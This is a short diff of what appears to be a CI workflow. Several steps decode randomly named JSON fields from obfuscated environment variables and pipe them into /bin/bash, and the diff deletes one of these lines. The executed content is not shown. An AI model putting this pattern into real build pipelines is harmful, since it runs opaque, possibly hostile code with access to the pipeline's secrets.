@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$wco3" | jq -r .pdfwg4482 | /bin/bash
           echo $vj14 | jq -r .apa91 | /bin/bash
           echo $mts4 | jq -r .oyohu237 | /bin/bash
-          echo $carf849 | jq -r .k38 | /bin/bash
           echo $px0 | jq -r .lux07170 | /bin/bash
 
       - name: Store results
